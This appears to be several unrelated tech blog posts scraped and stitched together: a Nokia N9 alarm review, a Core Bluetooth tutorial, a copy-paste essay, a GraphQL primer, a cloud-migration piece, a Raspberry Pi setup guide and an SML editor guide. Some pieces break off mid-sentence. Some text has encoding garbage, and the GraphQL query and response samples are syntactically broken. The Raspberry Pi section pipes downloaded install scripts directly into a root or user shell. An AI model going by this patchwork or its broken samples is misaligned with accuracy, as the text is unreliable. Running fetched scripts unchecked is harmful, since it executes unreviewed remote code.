<p>Touching on “Every day” doesn’t cancel the others, it selects all the day entries automatically, as well as the “Every day” entry itself. Deselecting a day will also deselect “Every day”. “Never” is automatically selected when everything is deselected, and “Every day” is automatically selected if you select each day individually.</p>
<p><a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/2.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/2-176x300.png" alt="2" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/2-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/2.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a></p>
<p>Once you’ve set an alarm, a popup tells you how much time is left until it goes off. I was surprised that it <em>even predicts daylight savings changes </em>for your location, adding or removing an hour as necessary. I always thought that the time was just adjusted by the phone company when it switched, but somehow <em>it knows</em>. If you try to set a time that won’t exist because of a daylight savings switch, it knows that too.</p>
<p>When the alarm goes off, it stops automatically when&nbsp;you pick up the phone,&nbsp;not when you choose Stop or Sleep. And of course, you can turn the phone off at night and it still turns itself on in the morning for the alarm.</p>
<p>It is missing one feature that I miss from Symbian: There’s no option to keep the phone on after you stop the alarm. So if the phone was off, it’ll go back off, and then you have to turn it on again.</p>
<p>I also appreciate the look they’ve gone for with Meego (the N9’s OS) in general. It’s near the flat design aesthetic that was just becoming popular at the time, but with more shadows and gradients to give everything some depth.</p>
<p>It’s unfortunate that simple applications are often worked on&nbsp;just enough to be functional. Sometimes we get more features that aren’t needed&nbsp;rather than&nbsp;polish to existing ones. Can we get more stuff like this instead?</p>

<h2 id="introduction">Introduction</h2>
<p>Itâ€™s really hard to overstate how much smartphones and tablets have transformed the world. Starting with the iPhone in 2007, these devices combine gorgeous and intuitive touch interfaces with a full suite of network technologies.</p>
<p>As an iOS developer, I wouldnâ€™t consider myself a stranger to networking. Itâ€™s almost a bread-and-butter requirement that every app these days has <em>some</em> kind of REST API that handles the encoding and decoding of data to and from a remote source.</p>
<p>But that side of the technology aside, another huge side of networking on a smartphone that Iâ€™ve never personally explored before is Bluetooth. And yet, sitting here, writing this post wearing my wireless headphones, with an Apple Watch strapped to my wrist, after I just played some Animal Crossing on my Nintendo Switch with a wireless Pro Controller, I feel like Bluetooth is something I take for granted. Itâ€™s a black box of magic that I never worry about in my day-to-day life. Itâ€™s just there, and it just worksâ„¢.</p>
<p>In all of my iOS engineering career, Iâ€™ve never been involved in a project, or had a need in any of my side projects, to learn the Bluetooth APIs Apple provides. So when my buddy Max asked me if Iâ€™d be interested in writing an app in order to demonstrate how Core Bluetooth works, and following up with a blog post on the experience, I jumped at the chance.</p>
<p>This blog post is geared for anyone else in the same boat as me. Someone who might not necessarily be a newbie to developing for Apple platforms, but has just never stopped to learn how the Core Bluetooth APIs work. Iâ€™ll discuss the core concepts behind Core Bluetoothâ€™s parent/child architecture, show how to send some basic data between devices, and then discuss some of the pitfalls I encountered.</p>
<h2 id="whatiscorebluetooth">What is Core Bluetooth?</h2>
<p>Core Bluetooth is an Apple public framework, and the only official way for third party apps to integrate Bluetooth functionality into their apps on iOS and iPadOS.</p>
<p>Up until this point, Core Bluetooth has been an abstraction over Bluetooth Low Energy (BLE), which is different from â€œclassicâ€� Bluetooth in allowing far more energy efficient communication to support low-powered devices. </p>
<p>What this has historically meant is that Core Bluetooth was aimed at low powered peripheral devices such as heart rate sensors, or home automation; the kinds of devices that primarily reside in a low power state and periodically broadcast small tidbits of information. </p>
<p>By contrast, devices using classic Bluetooth (like game controllers and wireless headphones), which are much more high powered and constantly streaming data, were previously impossible to access from third party apps.</p>
<p>However, as of iOS 13, Apple expanded Core Bluetooth to cover classic Bluetooth devices as well. While the public API hasnâ€™t changed through this, it does mean that a much wider variety of wireless devices now became available through it.</p>
<p>With all of these amazing capabilities, there has never been a better time to start learning how to adopt Core Bluetooth.</p>
<h2 id="basicconceptsofcorebluetooth">Basic Concepts of Core Bluetooth</h2>
<p>When working with Core Bluetooth, it is necessary to become accustomed with the specific terminology of all of the major components of the service and how they relate to each other.</p>
<h3 id="centralsandperipherals">Centrals and Peripherals</h3>
<p>BLE operates in a very traditional server/client sort of model. One device acts in the capacity of a server that contains information, and another acts as a client that queries for this information and processes/displays it locally.</p>
<p>Some devices broadcast advertisements about themselves. These are called "peripherals". Other devices scan for and connect to peripherals. These are called "centrals". After they are connected, usually the peripheral acts as the server and the central acts as the client. This is the way Core Bluetooth operates.</p>
<p>As a general example, when pairing a pair of Bluetooth headphones to a smartphone, the smartphone would be the central, and the headphones would be the peripheral.</p>
<p><img alt="Core Bluetooth Centrals Peripherals and Characteristics" src="https://images.ctfassets.net/38nhe7v4wswj/2phxlIZJeVuCblurCN3dIu/73b504d15b4fae4c38acff1121a2232e/core_bluetoot_central_peripheral_char.jpg"></p>
<h3 id="services">Services</h3>
<p>Obviously, the type of BLE device in question will determine what sort of capabilities it has. For example, a heart rate monitor can record a wearerâ€™s heart rate, but a smart thermostat would record the current temperature of its location.</p>
<p>Most apps will be built to support one or more specific class of device capability. For example, apps for tracking a user's health would have no interest in connecting to devices that aren't health related, such as a thermostat. In order to encapsulate and report on the capabilities of specific peripherals, Bluetooth requires that peripherals identify their classes or capabilities as â€œservicesâ€�.</p>
<p>Peripherals make themselves discoverable to centrals by broadcasting advertisement packets defining the main identifying service they offer. When a central scanning at the same time detects these packets and determines that the peripheral device it found supports the same class of service that it is searching for, it can begin the process of connecting. Traditionally, while only the main service of the device is advertised, once a connection is formed, the central can then query the peripheral for any additional services it offers.</p>
<p>In order for the central to determine it is compatible with a peripheral, it needs to know the ID values of the services that the peripheral supports. For very specific apps and peripheral devices, it makes sense to define a service using a shared UUID between both devices.</p>
<p>However, in more general practice, it makes sense for peripherals to adopt Bluetooth services that are a standard capability globally. For example, it would make sense that any device that records blood pressure readings could be connected to <em>any</em> Bluetooth device capable of processing that data, regardless of who manufactured either device. As such, <a href="https://www.bluetooth.com/specifications/gatt/services/">a public database exists</a> that lists a standardized set of service IDs that can be used between both centrals and peripherals who want to adopt a specific use case.</p>
<h3 id="characteristics">Characteristics</h3>
<p>For any given service, any number of separate sets of information and/or services might be included within it. For example, a heart rate sensor peripheral might feature a heart rate service, but then contained within that service is both the raw current heart rate value along with information on where the sensor is positioned over the wearer at the time.</p>
<p>As such, services may contain any number of â€œcharacteristicsâ€� which record various types of data, or perform various sub-functions of the service itself. They may be used to receive data from the peripheral, or send commands back to the peripheral. It is possible for centrals to explicitly query for information from a characteristic, or register an observer that will be called every time the characteristic has an update.</p>
<p>This concept of Bluetooth devices offering their capabilities as services and characteristics is officially called GATT, which is short for Generic Attribute Profile.</p>
<h3 id="corebluetoothconceptssummary">Core Bluetooth Concepts Summary</h3>
<p>Hopefully by this point, the basic layout of Core Bluetooth is starting to make sense to you. Parent devices are called centrals, and they connect to child devices known as peripherals. Peripherals manage their capabilities as services, who then manage their own capabilities via characteristics.</p>
<h2 id="puttingitallintopractice">Putting it all into practice</h2>
<p>Now that we've discussed the basic concepts of Core Bluetooth, we can start putting them into practice. For demonstrating the flow of connecting two devices, I've built a companion sample app around Core Bluetooth. The app is a very basic chat app that allows two devices to connect to each other, and to then send messages between each other. The app demonstrates how to both scan as a central and advertise a peripheral. Once connected, the app can then send messages both upstream and downstream through one pipeline.</p>
<h3 id="gettingstarted">Getting Started</h3>
<p>For starters, before we do anything else, we need to add the <code>NSBluetoothAlwaysUsageDescription</code> key to our app's Info.plist describing why we want to use Bluetooth. If this key isn't present, not only would the app be rejected by the App Store on submission, but the app itself throws an exception when trying to call any Core Bluetooth APIs. This is a security requirement of Apple, as all apps must get explicit permission from the user before Bluetooth is enabled. For our case, let's explain we need Bluetooth to enable our chat service.</p>
<pre><code><span>Access</span> <span>to</span> Bluetooth allows you <span>to</span> chat <span>with</span> others <span>from</span> their own devices!
</code></pre>
<p>Once that's in place, we can start using Core Bluetooth. In Swift, every source file that integrates the framework must have the following import statement.</p>
<pre><code><span>import</span> CoreBluetooth
</code></pre>
<h3 id="scanningasacentral">Scanning as a Central</h3>
<p>For iOS devices that fill the role of the central in a Bluetooth connection, they are represented by an object called <code>CBCentralManager</code>.</p>
<p>To begin, let's create a new instance:</p>
<pre><code><span>let</span> centralManager = <span>CBCentralManager</span>(delegate: <span>self</span>, queue: <span>nil</span>)
</code></pre>
<p>As you can see, an object must be designated as a delegate upon instantiation. This object must conform to <code>CBCentra…</code></p></article></div>

<h4>Copy-Pasting Saves Time</h4>



<p>Yes, that is true. And for some code snippets there is no problem with just copy-pasting it. Short snippets which you understand can be beneficial to your learning experience. I myself is guilty of copying code from Stack Overflow and other blogs. But those code snippets were just boilerplate which I understood. So, yes, copy-pasting saves time.</p>



<h4>Copy-Pasting Carelessly is a Bad Idea</h4>



<p>I know this. You are stressed and have tried to solve one problem for hours. What should I do, I cannot figure it out! Or maybe this one: <em>I am a newbie and just want to get code so I can continue with my program.</em> Both issues can be solved with copy-pasting without giving it some thought.</p>



<p>Onwards to my point! When you copy and paste you cement those things in your program. A function builds on another function and at the end you may have an unstable fundament. If you understand and can freely morph the copied code, you are in the clear. But if you just pasted it to continue the program and 50 functions later come to the realization that you must change that function. Can you? What is the answer? Copy-paste more? No, no, no … Now you have trouble! If you are not comfortable with the code, do not use it. Using code without understanding it are a ticking timebomb.</p>



<h2>Libraries</h2>



<h4>Libraries Saves Time</h4>



<p>If you do everything yourself (you are a badass) you are going to spend a lot of time reinventing the wheel. I myself are one of those people that wants to do everything myself. I want control! But if it is one thing I hate, it is boilerplate code. Libraries can help with that, making the boring past easy. So libraries can save time.</p>



<h4>Overuse of Libraries is a Bad Idea</h4>



<p>Hold your horses! Now you better have a great argument (the angry mob lights the torches). Using a library which is well supported and rigorously tested. Nothing wrong here… But can you really know every part of a library or framework, do you know the code? This problem is what I want to address in this text. If you do not know what is going on inside this black box of a library, how can you optimize it to run better and faster? Using a library can help you speed up the development. But at what cost? Overuse of libraries when you can spend time on creating it yourself is a problem.</p>

<h4>Going Further</h4>



<p>I know that this will either aggravate you or support your ideas. I wrote this text because I want to increase awareness of proper coding. So next time you use a library or copy-paste something, do what you think is right, now you know some advantages and drawbacks.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_70_fa5"><div><p>Once you get a grasp of what GraphQL is, and why it is important, you also realize that it is a different design process. And before diving into the implementation, it is important that we understand the GraphQL basics, the various terminologies that come with it.</p><p>If you are just getting started and still don’t know about the importance of GraphQL, we would recommend reading our previous post about <a aria-label="undefined (opens in a new tab)" href="https://www.wisdomgeek.com/development/web-development/why-graphql/" target="_blank" rel="noreferrer noopener">why GraphQL?</a></p><p><span>- Advertisement -</span> <ins data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1198872678846288" data-ad-slot="2989761355"></ins> </p><p>Looking at the way GraphQL works in the examples mentioned in that post, we realize that we only have one endpoint to work with instead of multiple REST endpoints. This means that we no longer look at our API as a collection of endpoints. Instead, we look at it as a collection of schemas, queries, and mutations.</p><p>Before we get into implementing GraphQL, we need to get a better idea of all the GraphQL basics: Types, Queries, Mutations, and Schema. We need to understand these terminologies first since an understanding of this GraphQL glossary will help us in doing things the GraphQL way.</p><h2>What is a Type?</h2><p>The first GraphQL basic term we will explore is a type. If we consider the blogging example (similar to the previous post), we will have the following data in our application:</p><ul><li>Posts</li><li>Comments</li><li>Authors (or can be Users)</li></ul><p>These are similar to the tables that we are used to creating in our relational databases. In GraphQL, we call these types which are a collection of these data entities that can also contain relationships with other entities. The relationships are similar to foreign keys in a relational database which can be lazy-loaded.</p><p><strong>Note:</strong> GraphQL does not care about what database is being used as the backend. So it can be a relational database, or these all can be collections in a NoSQL database. All we are doing is defining tyes and schemas in the codebase, to be able to interact with the database. This is pretty much similar to an Object-Relational Mapper (ORM) that most people are familiar with.</p><p>Since GraphQL is a strongly typed language, we specify the data type of the properties that it holds as well when defining the type. So the type for a post will look like:</p><pre><code>type Post {
  id: ID!
  title: String!
  content: String!
  publishedDate: String 
}</code></pre><p>The ID type and String type are built-in primitive types that are defined using the Schema Definition Language (SDL). The exclamation mark is present to tell that signify that the fields are required fields.</p><p>The ID, String, and other primitive types are known as Scalar types and the Post type that we created is known as Object type since it is a user-defined type. An object type can include another object type in it.</p><p><strong>Note: </strong>No matter what programming language is being used to implement GraphQL, the SDL remains the same.</p><h2>What is a Query?</h2><p>The single endpoint for GraphQL requires a query to know what data to return. And as the name query suggests, we send a POST request with the query to fetch data from a GraphQL endpoint. In simpler words, a query allows us to fetch data from a GraphQL server.</p><p>Queries look like the JSON object that we would expect in response from the server, but without the values in it. Also, the keys are on separate lines, not separated by commas. The server then fills in the values in these and sends the completed JSON object back to us as the response.</p><p>For allowing the client to be able to query our schema, we first need to define them on the server-side.</p><p>To get all the posts, we define it like:</p><pre><code>type Query {
  # Returns all blog posts
  getAllBlogs(): [Post]
}</code></pre><p>We can even extend this further by allowing the queries to accept parameters to fetch specific blog posts.</p><pre><code>type Query {
  # Returns all blog posts
  getAllBlogs(): [Post]

  # Returns a blog post matching input id
  getBlogPost(id: ID!): Post
}</code></pre><p>On the client-side, we can then fetch the data using the query operation:</p><pre><code>query getAllBlogs {
  id
  title
}</code></pre><p>When we execute this on the client, the server returns all the posts that we requested in the format that was requested. The response will be:</p><pre><code>getAllBlogs {
  ["id" : 1,  "title" : "Wisdom Geek"],
  ["id" : 2, "title" : "Saransh Kataria"],
}</code></pre><p>As we can see, even though we had the content and publish date defined for our posts, the server did not return those. The query defined on the server had them. But we did not request those as part of our query operation. Hence the server only returned what we asked for. They would have been returned if we had added them as part of our query in the client.</p><p><strong>Note:</strong> Since GraphQL is strongly typed, we cannot put in random words in our query on the client-side. The query should always match the schema that has been exposed from the server.</p><h2>What is a Mutation?</h2><p>Mutations are similar to queries with one difference. They are used to create new objects on the server.</p><p>Queries are used for reading objects from the server, and mutations are used to write them.</p><p>A single mutation contains a signature and a return type for that mutation. It defines what all properties the mutation needs to create the object and what it will return when the object is created. To create a blog post, we will make use of the following mutation:</p><pre><code>Mutation {
  addBlogPost(title: String!, content: String!): Post
}</code></pre><p>The id and published date field will be generated on the server-side. So we only need the title and the content of the blog post from the user. The mutation returns the newly created post object giving us a way to view what was created on the server.</p><p>Apart from queries and mutations, there is a third type of operation that can be performed using GraphQL known as subscriptions. Subscriptions allow us to watch data for real-time changes. They are specific to real-time applications only, so we are not going to cover much about it in this post.</p><h2>What is a Schema?</h2><p>A schema definition contains the type definition, its relationships as well as a description of how this data can be queried or modified. In other words, we define how the client application interacts using GraphQL in a schema.</p><p>Extending the post type that we defined before, and adding relationships and queries, it would look something like the following. Every post will have an author. And similarly, the author has a collection of posts defined as a relationship.</p><pre><code>type Post {
  id: ID!
  title: String!
  content: String!
  publishedDate: String 
  author: Author!
}
type Author {
  id: ID!
  name: String!
  posts: [Post]
}
Mutation {
  addBlogPost(title: String!, content: String!): Post
}
type Query {
  getAllBlogs(): [Post]
  getBlogPost(id: ID!): Post
}</code></pre><h2>But, What does the graph in GraphQL mean?</h2><p>Now that we have an idea of the GraphQL basics, there is one unanswered question. The Graph? The graph word does not mean a graph database or a graphical representation of the data. Instead, it refers to how we think about the data that we have in our application and its relationship with other data in the application.</p><p>In other words, we model all our business logic as a graph by defining a schema that contains all the types, their relationships, queries, and mutations.</p><p>And that should give you an overview of the GraphQL glossary. We hope that this post helped you understand the basic terminologies of GraphQL and now you have a better idea of the GraphQL basics: types, queries, mutations, and schemas. We will explore more about GraphQL and how to put these together in an application in a future post.</p><p>Until then, if you have any queries, drop a comment below. And if you don’t, share the post with your friends and help them learn too 😉</p></div></div></div>]]>

Further inquiry revealed that the teams compared apples to oranges (see point 1 above), put square peg in round holes (see point 2 above). In one enterprise use-case I have witnessed a globally distributed company, by virtue of their organisation structure, struggle to get the VPC design done right making them juggle from all-apps-in-one VPC to VPC-per-app and every possibility in-between, all during their cloud migration. This coupled with big-bang migration efforts resulted in utter chaos and demotivated teams. It took mighty efforts to motivate and align the teams back in order.&nbsp;</p><p>Overlooking simple security measures, could break the cloud migration or adoption plans. I know of many startups that jumped out of the AWS cloud adoption, because one of their developers ended-up leaving their EC2 ports open to public that resulted in a hacker breaking into their system wreaking their business.</p><p>The subtle but critical thing that is often overlooked is the team's ability to say, "I don't know but will learn it". Technology is hard and demanding. AWS as cloud platform is evolving as radical pace surprising its customers with newer capabilities that was requested for. So what impossible in AWS last year could well be possible in the present year. Their platform evolution is a manifestation of their customer-first attitude. I was talking to a couple of AWS Solutions Architects the other day who were in disbelief when I stated that it has been a few years since AWS made it possible to have <a href="https://aws.amazon.com/about-aws/whats-new/2017/11/announcing-support-for-inter-region-vpc-peering/">cross-region VPC peering</a>. Please do prepare to know your destination well enough, when you got opportunities for it.</p><p>What is more riskier is when enterprises miss opportunities to learn their current landscape, its strengths and weakness. One of the key things that help cloud migration is to learn and document your key business requirements as it stands today. This should be a living document that binds the application development team and the operations team. In my consulting endeavors, I build DevOps capability and maturity by bringing the Dev and Ops teams together in the preparation of such a living document in consultation with the Business stakeholders. Do you see how subtly I am aligning the teams to the business goals? This worked well for me thus for and hope it serves you too. Take it, put it to practice and thanks me later ;)</p><p>One other red-flag that I have encountered in the past is this practice of attempting to chew more than what you can at a point in time. Cloud migration is a tech endeavor that often has big positive impact to your business. Doing this needs proper preparation and focus towards mitigating risks. And the worst thing you can do in this endeavor is to do things big bang coupled with attempting your architectural tech-debts. In one business use-case that I have been in, an enterprise chose to do cloud migration of legacy applications deployed on-premise and at the same time to also modernize it. Phew!</p><p>Lastly offshoring cloud migration work COMPLETELY to third-party vendor is an anti-pattern in my humble opinion. It gets even worse when you pool in a couple of vendors for whatever reason and they end up not work together in your business interests. People problem is subtle but deep for long time until it manifests itself as a beast you can't control but only kill, costing you dear. As protip, I would strongly recommend you have a technical interface from your end on varied fronts to oversee, guide and learn together. You destination may have gold but it is your lessons learned along the way that gives you strength and ability to survive for long time to come.</p><p>Do feel free share your cloud migration experience that worked or caused you pain you can't forget. Eager to learn lessons from your experience...</p>

The cheapest option, the <a href="https://www.raspberrypi.org/products/raspberry-pi-zero/" target="_blank">Raspberry Pi Zero</a>, is capable of running a fully featured Linux distribution and driving a high definition display. It is the size of 3 coins (US Quarters) and costs $5. At $10, the <a href="https://www.raspberrypi.org/products/raspberry-pi-zero-w/" target="_blank">Raspberry Pi Zero W</a> comes with integrated WiFi and Bluetooth.</p>

<p><img src="https://www.secondstate.io/articles/getting-started-with-raspberry-pi-20200708-01.jpg" alt="raspberry pi"></p>
<p>With a generic ARM CPU and easy networking, the Raspberry Pi can easily become a personal application server for you. For example, you can put a web application (eg a collaborative record keeping app) on a Pi, bring it to a meeting, and make it accessible to everyone in the room. You do not even need the Internet. It is completely decentralized and censorship resistant.</p>
<p>The personal server is especially useful for developers. You can have a separate environment to deploy and test your server-side applications without having to mess with your laptop. The personal dev server is like Docker on steroids.</p>
<p>However, the $5 Pi is also, obviously, a resource constrained server. It only has 512MB of RAM and a single CPU core. It could benefit greatly from a lightweight and high-performance application runtime. But at the same time, we still like the ease-of-use and developer productivity of “heavy weight” scripting languages such as JavaScript. We want <a href="https://www.secondstate.io/articles/why-webassembly-server/" target="_blank">best of both worlds</a>.</p>
<p>Our solution is to deploy high-performance and resource-efficient <a href="https://www.secondstate.io/articles/getting-started-with-rust-function/" target="_blank">Rust functions inside Node.js</a> JavaScript apps. The <a href="https://www.secondstate.io/ssvm/" target="_blank">Second State WebAssembly VM (SSVM)</a> provides a light, efficient, secure, and portable runtime for Rust code. In this article, I will teach you how to set it up.</p>
<h2 id="setup-ubuntu-on-raspberry-pi">Setup Ubuntu on Raspberry Pi</h2>
<p>To use the Raspberry Pi as a personal dev server, I highly recommend installing the latest <a href="https://ubuntu.com/download/raspberry-pi" target="_blank">Ubuntu Server 20.04 TLS</a>. Just use the <a href="https://www.raspberrypi.org/downloads/" target="_blank">Raspberry Pi Imager</a> to select and load the Ubuntu Server 20.04 image onto a MicroSD card. Remember to set up a WiFi connection <a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#3-wifi-or-ethernet" target="_blank">on the MicroSD card</a> or <a href="https://linuxconfig.org/ubuntu-20-04-connect-to-wifi-from-command-line" target="_blank">after you login</a>.</p>
<blockquote>
<p>If you buy a Raspberry Pi kit with a preloaded MicroSD card, it probably comes with the Raspberry Pi OS (called NOOBS). It works with SSVM version <code>0.3.6</code> and ssvmup version <code>0.1.11</code>. You can make it work, but it requires some effort.</p>
</blockquote>
<p>Put the MicroSD card into your Pi device’s card slot, connect an HDMI display, keyboard, mouse, and power up! Follow the on-screen instructions to install Ubuntu Server 20.04. From there, you can create a user account, connect to WiFi, turn on SSH, and open the command line terminal. In order to use the Pi device as a “headless” server, you could request a static IP address from your router. In the future, you can just power it on, and connect to it via SSH from your laptop — there is no need for display, keyboard, and mouse. Once you are set up, use the following command to find your Pi’s IP address on your local network.</p>
<pre><code data-lang="src">$ hostname -I
192.168.2.108 172.17.0.1
</code></pre><p>As with all new Linux installations, it is a good idea to update and upgrade to the latest packages. Run the command below and be patient. It could take an hour.</p>
<pre><code data-lang="src">$ sudo apt update &amp;&amp; sudo apt upgrade
</code></pre><p>Next, run the following command to install essential developer libraries.</p>
<pre><code data-lang="src">$ sudo apt install build-essential curl unzip libboost-all-dev
</code></pre><h2 id="install-nodejs-and-ssvm">Install Node.js and SSVM</h2>
<p>The following two commands to install Node.js on your Pi.</p>
<pre><code data-lang="src">$ curl -sL https://deb.nodesource.com/setup_10.x | sudo bash -
$ sudo apt install nodejs
</code></pre><p>From here, you can use npm to install modules. Here we install the <a href="https://www.secondstate.io/ssvm/" target="_blank">Second State VM (ssvm)</a> to support high performance Rust functions in Node.js applications.</p>
<pre><code data-lang="src">$ npm install ssvm
</code></pre><p>Next, let’s try to run a couple of demo applications.</p>
<h2 id="run-a-demo-nodejs-application">Run a demo Node.js application</h2>
<p>Get the <a href="https://github.com/second-state/wasm-learning/tree/master/nodejs/quadratic" target="_blank">demo application</a> from the Internet, and unzip the compressed archive.</p>
<pre><code data-lang="src">$ curl -O https://www.secondstate.io/download/quadratic.zip
$ unzip quadratic.zip
</code></pre><p>Next, run a test program to make sure that the Node.js JavaScript function can correctly call the Rust function through SSVM.</p>
<pre><code data-lang="src">$ cd quadratic/node
$ node test.js
[0.5,-3.0]
</code></pre><p>Start the Node.js server application from the command line terminal.</p>
<pre><code data-lang="src">$ npm install express // Required for the web app.
$ cd quadratic/node
$ node server.js
</code></pre><p>Point the browser to http://localhost:8080/ or you can access it from another computer on your network.</p>
<p><img src="https://www.secondstate.io/articles/getting-started-with-raspberry-pi-20200708-02.png" alt="raspberry pi"></p>
<p>It is a web application that teaches math and solves quadratic equations. It could come really handy in a small group in a classroom!</p>

<p>You do not really need developer tools on a personal server. But the Raspberry Pi device is powerful enough to compile and build software. In fact, one of its common uses cases is to teach programming. The Raspberry Pi OS comes pre-loaded with developer tools for Java, Python, and Scratch. Now, let’s install some serious tools on it! I always install Git on all my development environments.</p>
<pre><code data-lang="src">$ sudo apt install git
</code></pre><p>The following command installs the Rust compiler toolchain on the Pi.</p>
<pre><code data-lang="src">$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
</code></pre><p>Run the following command to set up the correct path without logging out and back in again.</p>
<pre><code data-lang="src">$ source $HOME/.cargo/env
</code></pre><p>Next, you can clone our <a href="https://github.com/second-state/wasm-learning/" target="_blank">Rust learning repository</a>, and learn from examples.</p>
<pre><code data-lang="src">$ git clone https://github.com/second-state/wasm-learning.git
</code></pre><p>Here is the <a href="https://www.secondstate.io/articles/a-rusty-hello-world/" target="_blank">hello world example</a>. Have fun!</p>
<pre><code data-lang="src">$ cd wasm-learning/rust/hello
$ cargo build
   Compiling hello v0.1.0 (/home/pi/Dev/wasm-learning/rust/hello)
    Finished dev [unoptimized + debuginfo] target(s) in 4.35s
$ target/debug/hello

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">
  <article>
    <p>When it comes right down to it, SML is a pretty great language. It’s clear that
extensive thought has gone into its design and implementation. I quite enjoy
programming in SML, due in no small part to my collection of workflow hacks that
make editing and developing with SML responsive and interactive.</p>

<!-- more -->


<p>We’re going to be walking through a couple easy steps to make developing SML
feel more fluid. I have a slight preference for Vim (Neovim) on macOS, but many
of these steps are platform agnostic.</p>

<p><strong>Note</strong>: I updated this post to more accurately reflect my SML dev setup in
December 2019.</p>

<h2>Installing SML Locally</h2>

<p>While developing SML in a remote environment like the shared Andrew Unix
machines makes it easy to dive right in, I prefer doing development on my
laptop—it doesn’t get slow when there are many people logged in, there’s no
nightly reboots, and it doesn’t matter whether I have a strong WiFi connection.</p>

<p>On macOS and Ubuntu, the two most popular implementations of SML are already
packaged. Take the time to install a version of SML right now:</p>

<ul>
<li><p>At CMU we use <a href="http://smlnj.org/">SML/NJ</a>, which is convenient because it has a REPL that
for playing around with SML interactively.</p></li>
<li><p>To play around with releasing programs written in SML to other people, install
<a href="http://www.mlton.org/">MLton</a>. It has better support for compiling SML programs to standalone
executables which can be shared from one machine to another. (I have a
separate post on <a href="https://blog.jez.io/sml-travis-ci/">using SML to release software publically</a>
with more details).</p></li>
</ul>


<figure><figcaption><span>Install SML from your package manager</span></figcaption><div><div><pre><code><span><span># macOS -- one or both of:</span>
</span><span>brew install smlnj
</span><span>brew install mlton
</span><span>
</span><span><span># Ubuntu -- one or both of:</span>
</span><span>sudo apt-get install smlnj
</span><span>sudo apt-get install mlton</span></code></pre></div></div></figure>


<p>Feel free to install both; they’ll play nicely with each other, and each offers
advantages over the other.</p>

<p>Note for macOS users: if you’ve never used <a href="https://brew.sh/">Homebrew</a> before, you’ll need
to <a href="https://brew.sh/">install it first</a>.</p>

<p>Note for Ubuntu users: the versions of these two that ship in the default
package distribution are frequently out of date. If that matters to you,
consider following the the <a href="http://smlnj.org/">SML/NJ</a> and <a href="http://www.mlton.org/">MLton</a> installation
instructions directly.</p>

<h2>Getting Comfortable with SML/NJ</h2>

<p>The rest of these steps should apply regardless of whether you’re working on SML
locally or remotely.</p>

<p>One thing that I’ve seen far too many times from course documentation is that
they tell students to run their code like this:</p>

<ol>
<li>Run <code>sml</code></li>
<li>Type <code>use "foo.sml";</code> or <code>CM.make "sources.cm";</code> at the REPL</li>
</ol>


<p>Don’t get me wrong; this works, but there’s a better way. Being responsible
CLI-citizens, we should always be looking for ways to tab-complete. We can
easily get tab-completion on the filename by changing our workflow:</p>

<ol>
<li>Run <code>sml foo.sml</code> or <code>sml -m sources.cm</code></li>
</ol>


<p>Look at that! We’ve,</p>

<ul>
<li>dropped a step (having to launch the REPL first), and</li>
<li>introduced tab completion (because the shell has filename completion)</li>
</ul>


<p>It’s the little things, but they add up.</p>

<h2>Enhancing the REPL</h2>

<p>Speaking of the little things, when using the SML REPL, you don’t have access to
all the usual command line niceties like command history and access to arrow
keys for editing, let alone Vi-like keybindings. To get started, you’ll have to
change how you launch the SML/NJ REPL. In particular, we’re going to preface our
commands with <code>rlwrap</code>:</p>

<figure><div><div><pre><code><span><span># instead of this...</span>
</span><span><span>$ </span>sml
</span><span>
</span><span><span># use this:</span>
</span><span><span>$ </span>rlwrap sml</span></code></pre></div></div></figure>


<p><code>rlwrap</code> stands for “readline wrap.” Readline is a library that adds all the
features mentioned above to any REPL program:</p>

<ul>
<li>Command history tracking (up arrow keys)</li>
<li>Line editing with arrow keys</li>
<li>Configuration through the <code>~/.inputrc</code> file

<ul>
<li>We can use this to get fancy features like Vi keybindings</li>
</ul>
</li>
</ul>


<p>For more information, see <a href="https://github.com/jez/dotfiles/blob/ed8e531eebe43a8aef05fc4cb768157d03408cea/inputrc#L12-L14">these lines</a> of my inputrc, a small part of
my <a href="https://github.com/jez/dotfiles">dotfiles repo</a> on GitHub.</p>

<h2>Setting Up Vim</h2>

<p>Programming is so much more enjoyable when you’re not fighting your editor. For
me, this means striving to get the most out of Vim. In this section, I’ll
outline all the cool tips and tricks I have for developing SML in Vim.</p>

<p>But first, if you’ve never taken a look into how to configure Vim, I suggest you
start out by walking through this quick workshop called <a href="https://github.com/jez/vim-as-an-ide">Vim as an
IDE</a>. It’ll teach you where to start when configuring Vim and get
you set up with a bunch of standard plugins that improve on the standard Vim
experience tenfold.</p>

<p>No actually, take a second and <a href="https://github.com/jez/vim-as-an-ide">walk through it</a>. We’ll still be
here when you’re done, and you’ll appreciate Vim more when you’re done.</p>

<h3>ALE</h3>

<p><a href="https://github.com/dense-analysis/ale">ALE</a> is a Vim plugin that provides what it calls “asynchronous linting.”
That’s a fancy way of saying that it can show little red x’s on all the lines
that have errors. It works for many languages out of the box, including Standard
ML.</p>

<p>It’s super simple to set up. The <a href="https://github.com/dense-analysis/ale">ALE homepage</a> should have all the
instructions.</p>

<p>With ALE set up, try writing this into a file called <code>test.sml</code>:</p>

<figure><figcaption><span>test.sml</span></figcaption><div><div><pre><code><span><span>val</span> <span>foo</span> <span>:</span> <span>string</span> <span>=</span> <span>42</span></span></code></pre></div></div></figure>


<p>While typing, any errors should appear as markers to the left of the line
numbers. Super handy!</p>

<p>If nothing shows up, check <code>:ALEInfo</code> which dumps a bunch of information
about whether ALE was set up correctly. In particular, SML support requires
having <a href="http://smlnj.org/">SML/NJ</a> installed (i.e., installing it on your laptop or working
on a server where it’s already installed).</p>

<h3>Extra ALE Setup</h3>

<p>While the default settings for ALE work well enough, there’s plenty of reasons
to tweak them. For example, here are <a href="https://github.com/jez/dotfiles/blob/b942b6336ee968c9d94a9ea363c1cbcdb44b9846/vim/plug-settings.vim#L227-L239">all my ALE settings</a>.</p>

<p>The key changes I make:</p>

<ul>
<li>I ask ALE to show a list of all errors if there were any.</li>
